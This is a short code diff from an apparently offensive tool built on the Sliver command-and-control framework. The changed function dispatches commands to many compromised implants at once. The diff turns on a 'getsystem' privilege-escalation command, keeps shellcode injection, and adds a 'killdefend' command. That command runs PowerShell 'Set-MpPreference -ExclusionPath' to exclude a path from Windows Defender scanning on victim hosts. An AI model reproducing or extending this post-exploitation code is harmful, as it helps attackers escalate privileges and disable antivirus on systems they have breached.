@@ -25,14 +25,12 @@ func RunMass(rpc rpcpb.SliverRPCClient, args ...string) {
 		dispatch.Upload(rpc, args[1:]...)
 	case "nosferatu":
 		dispatch.Nosferatu(rpc, args[1:]...)
-		// bof this
-		// case "getsystem":
-		// 	dispatch.GetSystem(rpc, args[1:]...)
-		// bof this
+	case "getsystem":
+		dispatch.GetSystem(rpc, args[1:]...)
 	case "shinject":
 		dispatch.Shinject(rpc, args[1:]...)
-		// case "killdefend":
-		// 	dispatch.GetSystem(rpc, args[1:]...)
+	case "killdefend":
+		dispatch.Execute(rpc, []string{"cmd.exe", "/c", "powershell", "-c", "set-mppreference", "-exclusionpath", args[1]}...)
 	}
 
 }
